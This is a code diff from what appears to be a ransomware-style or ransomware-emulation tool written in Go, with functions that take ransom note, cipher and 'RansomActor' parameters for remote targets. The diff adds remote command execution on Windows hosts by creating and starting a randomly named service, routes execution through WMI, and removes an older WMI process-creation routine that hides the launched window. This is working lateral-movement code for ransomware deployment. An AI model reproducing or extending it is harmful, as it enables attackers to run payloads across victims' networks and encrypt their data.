@@ -2,13 +2,10 @@ package main
 
 import (
 	"fmt"
-	"github.com/go-ole/go-ole"
-	"github.com/go-ole/go-ole/oleutil"
 	"io"
 	"os"
 	"strings"
 	"sync"
-	"unsafe"
 )
 
 func handleRemoteTargets(targets []string, args map[string]any, extension string, notename string, note string, group RansomActor, cipher string) {
@@ -109,11 +106,27 @@ func handleRemoteTargets(targets []string, args map[string]any, extension string
 }
 
 func execute(commandLine string, target string, method string) {
-	// If wmi, we will launch a process remotely
+	printFormattedMessage(fmt.Sprintf("Executing command on target %s: %s via %s", target, commandLine, method), INFO)
 	if strings.ToLower(method) == "wmi" {
-		executeWMI(commandLine, target)
+		printFormattedMessage(fmt.Sprintf("Executing command on target %s via WMI", target), INFO)
+		err := executeRemoteWMI(target, commandLine)
+		if err != nil {
+			printFormattedMessage(fmt.Sprintf("Failed to execute command on target %s: %s", target, err.Error()), ERROR)
+		}
 	} else if strings.ToLower(method) == "service" {
-		printFormattedMessage("Service method not yet implemented", ERROR)
+		serviceName := RandStringBytes(18)
+		displayName := "impacted"
+		description := "This is a custom service created programmatically"
+		//binPath := "C:\\Program Files\\MyApp\\myapp.exe --param1=value1 --param2=value2"
+
+		printFormattedMessage(fmt.Sprintf("Creating and starting service on target %s", target), INFO)
+
+		err := CreateAndStartRemoteWindowsService(target, serviceName, displayName, description, commandLine)
+		if err != nil {
+			printFormattedMessage(fmt.Sprintf("Failed to create and start service on target %s: %s", target, err.Error()), ERROR)
+			return
+		}
+		printFormattedMessage(fmt.Sprintf("Service '%s' started successfully on target %s", serviceName, target), INFO)
 	} else if strings.ToLower(method) == "schtask" {
 		printFormattedMessage("Scheduled task method not yet implemented", ERROR)
 	} else if strings.ToLower(method) == "reg" {
@@ -126,85 +139,4 @@ func execute(commandLine string, target string, method string) {
 		printFormattedMessage(fmt.Sprintf("Unknown method %s specified", method), ERROR)
 		return
 	}
-
-}
-
-func executeWMI(commandLine string, target string) {
-	printFormattedMessage(fmt.Sprintf("Executing command on target %s: %s", target, commandLine), INFO)
-	err := ExecuteCommandRemoteWMI(target, commandLine)
-	if err != nil {
-		printFormattedMessage(fmt.Sprintf("Failed to execute command on target %s: %s", target, err.Error()), ERROR)
-	}
-}
-
-func ExecuteCommandRemoteWMI(remoteHost, command string) error {
-	// Initialize COM
-	if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
-		return fmt.Errorf("failed to initialize COM: %v", err)
-	}
-	defer ole.CoUninitialize()
-
-	// Connect to WMI on remote host
-	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
-	if err != nil {
-		return fmt.Errorf("failed to create WbemScripting object: %v", err)
-	}
-	defer unknown.Release()
-
-	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
-	if err != nil {
-		return fmt.Errorf("failed to query WMI interface: %v", err)
-	}
-	defer wmi.Release()
-
-	// Connect to the remote host
-	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer", remoteHost, "root\\cimv2")
-	if err != nil {
-		return fmt.Errorf("failed to connect to remote host %s: %v", remoteHost, err)
-	}
-	service := serviceRaw.ToIDispatch()
-	defer service.Release()
-
-	// Create and execute the process
-	processStartup := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_ProcessStartup")))))
-	defer processStartup.Clear()
-
-	processClass := oleutil.MustCallMethod(service, "Get", processStartup).ToIDispatch()
-	defer processClass.Release()
-
-	processInstance := oleutil.MustCallMethod(processClass, "SpawnInstance_").ToIDispatch()
-	defer processInstance.Release()
-
-	// Set process properties to hide window
-	oleutil.PutProperty(processInstance, "ShowWindow", ole.NewVariant(ole.VT_I4, 0))
-
-	// Create process
-	process := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_Process")))))
-	defer process.Clear()
-
-	processClass = oleutil.MustCallMethod(service, "Get", process).ToIDispatch()
-	defer processClass.Release()
-
-	// Execute the command
-	methodName := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Create")))))
-	defer methodName.Clear()
-
-	cmd := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString(command)))))
-	defer cmd.Clear()
-
-	currentDir := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("")))))
-	defer currentDir.Clear()
-
-	result, err := oleutil.CallMethod(processClass, "Create", cmd, currentDir, processInstance, 0)
-	if err != nil {
-		return fmt.Errorf("failed to execute command: %v", err)
-	}
-
-	// Get return code
-	returnValue := int(result.Val)
-	if returnValue != 0 {
-		return fmt.Errorf("process creation failed with code %d", returnValue)
-	}
-
-	return nil
 }
